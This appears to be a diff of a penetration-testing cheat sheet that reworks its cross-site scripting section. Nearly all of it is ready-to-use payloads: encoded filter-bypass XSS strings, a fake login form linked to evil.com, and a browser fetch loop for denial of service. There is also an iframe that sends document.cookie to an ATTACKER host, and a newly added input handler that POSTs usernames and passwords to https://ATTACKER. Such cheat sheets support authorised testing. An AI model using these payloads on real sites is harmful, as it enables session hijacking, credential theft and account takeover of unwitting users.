@@ -2871,9 +2871,8 @@ Manually testing for XXE vulnerabilities generally involves
 - Nuclei template `%USERPROFILE%\nuclei-templates\vulnerabilities\generic\crlf-injection.yaml`
 
 #### <ins>Payloads</ins>
-- `" onload=alert() alt="`
-- `<img src=x onerror=alert()>`
-- `javascript:alert(document.cookie)`
+
+
 - HTML injection
   - ```HTML
     <p style="color:red">ERROR! Repeat the login</p>Membership No.<br/><input><br/><a href=http://evil.com><br><input type=button value="Login"></a><br/><img src=http://evil.com style="visibility:hidden">
@@ -2912,45 +2911,48 @@ Manually testing for XXE vulnerabilities generally involves
   ```JavaScript
   for(;;){fetch('https://VICTIM/',{method:'GET'});}
   ```
-- ```HTML
-  %253c%252fscript%253e%253cscript%253ealert(document.cookie)%253c%252fscript%253e
-  ```
-- ```HTML
-  <a href="jAvAsCrIpT:alert(1)">payload</a>
-  ```
-- ```JavaScript
-  %22%20onbeforeinput=alert(document.domain)%20contenteditable%20alt=%22
-  ```
-- ```JavaScript
-  1672&81782%26apos%3b%3balert(%26apos%3bXSS%26apos%3b)%2f%2f232=1
-  ```
-- ```HTML
-  <svg/onload=alert(0)>
-  ```
-- ```HTML
-  <script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,100,111,109,97,105,110))</script>
-  ```
-- ```HTML
-  <a href=jav%26%23x61%3bscript:alert()>
-  ```
   - [source 1](https://twitter.com/TakSec/status/1649091314842238978), [source 2](https://brutelogic.com.br/blog/alternative-javascript-pseudo-protocol/)
 - ```HTML
   data:text/javascript,console.log(3 + '\n' + `};console.log(1);//<img src=x onerror=javascript:console.log(2) oncopy=console.log(4)>`);//&quot; onerror=console.log(5) id=&quot;x
   ```
   - For the challenge [5Ways2XSS - DOJO #23 | YesWeHack](https://dojo-yeswehack.com/practice/d5e8e5ddf9af)
-- ```HTML
-  %22-alert(document.cookie)-%22
-  ```
-- ```HTML
-  %00%22%3E%3Cimg%20src%3da%20onerror%3dconfirm(document.domain)%3E
-  ```
 - [DOM XSS in jQuery selector sink using a hashchange event](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)
   - `<iframe src="https://VICTIM.net/#" onload=this.src='http://ATTACKER/?x='+document.cookie;></iframe>`
   - `<iframe src="https://VICTIM.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`
-- `<><img src=x onerror=alert()>`
-- `<body onresize=print() onload=this.style.width='100px'>`
-- `<xss id=x onfocus=alert(document.cookie) tabindex=1>`
-- `"><svg><animatetransform onbegin=alert(1)>`
+- [source 1](https://twitter.com/TakSec/status/1649091314842238978), [source 2](https://brutelogic.com.br/blog/alternative-javascript-pseudo-protocol/)
+  ```HTML
+  <a href=jav%26%23x61%3bscript:alert()>
+  ```
+- Steal values from inputs
+  ```HTML
+  <input name=username id=username>
+  <input type=password name=password onchange="if(this.value.length)fetch('https://ATTACKER',{
+  method:'POST',
+  mode: 'no-cors',
+  body:username.value+':'+this.value
+  });">
+  ```
+
+**Misc payloads**
+```HTML
+" onload=alert() alt="
+<img src=x onerror=alert()>
+javascript:alert(document.cookie)
+%253c%252fscript%253e%253cscript%253ealert(document.cookie)%253c%252fscript%253e
+<a href="jAvAsCrIpT:alert(1)">payload</a>
+%22%20onbeforeinput=alert(document.domain)%20contenteditable%20alt=%22
+1672&81782%26apos%3b%3balert(%26apos%3bXSS%26apos%3b)%2f%2f232=1
+<svg/onload=alert(0)>
+<script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,100,111,109,97,105,110))</script>
+%22-alert(document.cookie)-%22
+%00%22%3E%3Cimg%20src%3da%20onerror%3dconfirm(document.domain)%3E
+<><img src=x onerror=alert()>
+<body onresize=print() onload=this.style.width='100px'>
+<xss id=x onfocus=alert(document.cookie) tabindex=1>
+"><svg><animatetransform onbegin=alert(1)>
+http://foo?&apos;-alert(1)-&apos;
+${alert(1)}
+```
 
 #### <ins>XSS -> ATO Escalation</ins> [[Reference](https://twitter.com/Rhynorater/status/1682401924635566080)]
 - Change email > Password reset
